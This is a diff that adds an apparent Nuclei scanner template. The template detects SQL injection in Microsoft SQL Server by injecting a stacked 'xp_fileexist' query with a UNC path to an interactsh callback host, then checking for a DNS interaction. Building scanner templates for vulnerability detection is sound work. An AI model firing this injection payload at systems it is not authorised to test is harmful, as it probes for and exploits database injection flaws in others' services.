@@ -1,0 +1,18 @@
+id: mssql-oob-xp-fileexist
+
+info:
+  name: MSSQL OOB via xp_fileexist
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,mssql
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
+      
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
